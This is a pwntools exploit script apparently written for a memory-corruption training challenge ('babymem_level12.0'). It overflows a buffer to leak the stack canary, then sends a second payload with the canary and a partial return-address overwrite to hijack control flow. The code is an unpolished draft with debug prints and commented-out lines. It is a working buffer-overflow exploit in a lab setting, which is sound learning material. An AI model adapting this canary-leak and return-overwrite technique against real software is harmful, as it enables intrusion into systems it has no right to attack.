from pwn import *
context.terminal = "bash"
p = process("/challenge/babymem_level12.0")
for j in range(40):
    print(p.recvline())
print(p.recvuntil(b"size:"))
#p.sendline(b'100')
p.sendline(b'100')
print(p.recvuntil(b"bytes)!"))
win = b"A"*63
win += b"R"
win += b"E"
win += b"P"
win += b"E"
win += b"A"
win += b"T"
win += b"A"*3
#win += pack(0x24ef)
#print(win)
sys.stdout.flush()
p.sendline(win)
#---------------------------------------------------
for j in range(40):
    print(j , " ",p.recvline())
print(p.recvuntil(b"said:"))
print("aaaaaaaaaaaaaaaaaaaaa")
print(p.recvline())
canary = p.recvline()
print("HEEEEEEEEEEEEEEEEEEY AM HERE ->  ",canary)
#print(u64(canary))
for j in range(40):
    print(p.recvline())
print(p.recvuntil(b"size:"))
p.sendline(b'100')
win = b"A"*72
win += b'\x00'+canary
win += b"A"
win += b'\xef\x24'
print(win)
#p.sendline(b'\x00') #appending 0a
p.send(win)
#win = b"A"*8

for j in range(100):
    print(j , " ",p.recvline())

# 76  10 bytes read ---- 100
# 0x45239b59d705ce00 CANARY 



